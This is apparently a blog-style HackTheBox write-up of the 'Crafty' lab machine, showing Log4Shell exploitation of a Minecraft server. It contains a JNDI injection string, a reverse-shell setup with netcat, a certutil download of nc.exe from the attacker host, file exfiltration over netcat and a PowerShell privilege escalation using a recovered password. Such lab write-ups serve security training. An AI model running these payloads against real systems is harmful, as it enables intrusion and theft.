---
title: "Crafty HTB Writeup"
date: 2025-04-26
categories: [CTF, HackTheBox]
tags: [nmap, minecraft, log4j, windows, reverse-shell]
description: "HackTheBox Crafty - exploiting Minecraft Log4Shell vulnerability to gain access."
---

Crafty

- NMAP

```bash
nmap 10.129.18.108 -Pn -p- -vv
```

![image1](../resources/7f6f9de8a68c43529a78a3a93da82432.png)

![image2](../resources/ea607668383b4b43b895b8d204e94ced.png)

- Add crafty.htb to /etc/hosts

```bash
echo "10.129.18.108 crafty.htb" | sudo tee -a /etc/hosts
```

![image3](../resources/0c469be9cae94b47a10b31475f4fb648.png)

- Subdomain enumeration:

```bash
wfuzz -u crafty.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.crafty.htb" --hl 1
```

- Download a Minecraft player - Tslauncher
- Run the .jar file and enter any username and choose the version
- Then install and enter game

```bash
java -jar TLauncher.jar
```

![image4](../resources/e700db17322b46c894cdb1d2a1e05a43.png)

- Add server

![image5](../resources/abdcb0a295774fb2887aff7fe046ee8c.png)

- Join server

- Here is a POC log4j-shell for this version
[https://github.com/kozmer/log4j-shell-poc](https://github.com/kozmer/log4j-shell-poc)

[CVE-2021-44228 - Log4j - MINECRAFT VULNERABLE! (and SO MUCH MORE)](https://www.youtube.com/watch?v=7qoPDq41xhQ&t=1532s)

<https://github.com/pentesterland/Log4Shell>

- Clone the directory and cd into it

```bash
git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
```

- Download jdk1.8 - and rename the folder to jdk1.8.0_20:

```bash
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz
tar -xvzf jdk-8u181-linux-x64.tar.gz
mv jdk1.8.0_181 jdk1.8.0_20
```

![image6](../resources/ee44a7394d2c49f7a2f48906655ace59.png)

- Set up listener:

```bash
nc -lnvp 4444
```

![image7](../resources/48d8b33e64604a0abe5755c4c35e82a5.png)

- Run python script:

```bash
python3 poc.py
```

![image8](../resources/2a6be0a37b4845468af83680650ab7b3.png)

- Copy the string to send:

```text
${jndi:ldap://10.10.14.38:1389/a}
```

- In the TSlauncher app - Press T to open the chat box  
Paste in the code

![image9](../resources/eb77e1bdc5dd4b79ba3d9f006d4bf750.png)

- We can see the GET requests from the webserver

![image10](../resources/e2de18d6eee94781a36f125acd3b3aaa.png)

- But no shell

- Looking at the code:

![image11](../resources/c1c477ab501e47a4822bc2ebd950f9a0.png)

This is for a linux server.

- We need to change the payload for a windows reverse shell:

![image12](../resources/fb4dc851877d48d6aeb1d9e65e93c531.png)

- Replace `/bin/sh` with `cmd.exe` - The IP and Port forwarding happens in the Java code itself.

- Repeat the steps:
  - Set up listener
  - Run the python poc.py
  - Copy the command
  - Paste into minecraft chat

- Shell

![image13](../resources/dea363b4e8d84b54beb1ae132ff1fbcf.png)

![image14](../resources/f51ba3ae5440494eb2db2edb38035d26.png)

```cmd
dir /Q /A
```

![image15](../resources/946cc9ac07884f1ca9832230a8fac5b5.png)

![image16](../resources/42ec1a1104734f73a6f3b660549a5bf9.png)

- We can't read it here so we need to transfer it to Kali.

- Set up python server:

```bash
python3 -m http.server 8082
```

- Copy over `nc.exe` to Windows:

```cmd
certutil.exe -urlcache -f http://10.10.14.38:8082/nc.exe c:\Users\svc_minecraft\Documents\nc.exe
```

- Using nc we can send and receive:

- On Kali:

```bash
nc -lnvp 4444 > playercounter-1.0-SNAPSHOT.jar
```

- On Windows:

```cmd
c:\Users\svc_minecraft\Documents\nc.exe 10.10.14.38 4444 < playercounter-1.0-SNAPSHOT.jar
```

- **Ctrl+C on Kali** to stop the connection

![image17](../resources/e378fe1871a4436fa736c9c733261a69.png)

![image18](../resources/bc6ff71c4c154b829e107a9bfaa3e30e.png)

![image19](../resources/f208caddc1fd4d66b50701600784f93d.png)

- Reading the Java archive file:

```bash
jar tf playercounter-1.0-SNAPSHOT.jar
```

![image20](../resources/c04022b0930746f18756ef11a8b44b46.png)

- Extract with:

```bash
jar xf playercounter-1.0-SNAPSHOT.jar
```

- That didn't extract anything useful and not all the files were there, as seen above.

- Open the .jar file with a Java Decompiler JD-GUI:

![image21](../resources/c197fd20d73246b592c27752ed51b77d.png)

- That could be a password.

- Open powershell and enter the following to open a new powershell session as Admin:

```powershell
$User = "Administrator"
$Password = ConvertTo-SecureString "<Password>" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($User, $Password)
Start-Process cmd.exe -Credential $Credential
```

![image22](../resources/e8118c5febff4f6a8cd1940e5ce1b7ed.png)

![image23](../resources/09db6d41587c45dab9dffdd37a7041e0.png)
